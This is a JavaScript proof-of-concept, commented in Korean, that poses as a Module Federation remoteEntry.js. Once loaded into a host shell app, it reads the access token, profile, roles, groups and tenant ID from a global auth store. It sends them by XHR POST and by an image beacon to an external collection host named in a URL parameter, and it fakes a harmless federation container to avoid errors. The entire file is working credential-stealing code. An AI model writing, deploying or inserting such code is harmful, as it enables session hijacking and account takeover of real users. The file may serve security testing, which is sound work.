// Module Federation 형식의 악성 remoteEntry.js
// Shell의 DynamicRemoteLoader가 <script src>로 로드하면
// Shell과 같은 origin에서 실행됨

(function() {
  var params = new URLSearchParams(window.location.search);
  var EXFIL = params.get('exfil') || '';

  // 토큰 탈취
  var store = window.__NEXUS_AUTH_STORE__;
  if (!store) return;

  var state = store.getState();
  var data = {
    vector: 'remoteEntry-injection',
    timestamp: new Date().toISOString(),
    token: state.accessToken,
    username: state.profile ? state.profile.preferred_username : null,
    email: state.profile ? state.profile.email : null,
    roles: state.roles,
    groups: state.groups,
    tenantId: state.tenantId,
    url: window.location.href
  };

  console.log('[remoteEntry PoC] Token stolen:', data.username, data.roles);

  // 외부 전송
  if (EXFIL) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', EXFIL + '/collect', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify(data));
    } catch(e) {}
    try {
      new Image().src = EXFIL + '/collect?d=' + btoa(JSON.stringify({
        token: data.token, username: data.username, roles: data.roles
      })) + '&_=' + Date.now();
    } catch(e) {}
  }

  // MF 컨테이너 위장 (에러 방지)
  window.evilApp = {
    get: function(module) {
      return function() {
        return {
          __esModule: true,
          default: function() { return null; }
        };
      };
    },
    init: function() {}
  };
})();
